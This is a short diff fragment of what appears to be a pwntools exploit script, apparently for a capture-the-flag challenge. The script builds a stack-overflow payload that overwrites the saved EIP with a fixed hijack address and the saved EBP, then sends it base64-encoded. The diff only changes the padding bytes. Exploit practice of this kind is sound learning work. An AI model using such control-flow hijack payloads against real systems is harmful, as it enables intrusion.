@@ -20,7 +20,7 @@ hijack_eip = 0x08049284
 print(f"new_ebp = 0x{new_ebp:02x}")
 
 
-payload = p32(0xdeadbeef) + p32(hijack_eip) + p32(new_ebp)
+payload = cyclic(4) + p32(hijack_eip) + p32(new_ebp)
 
 r.sendline(base64.b64encode(payload))
 
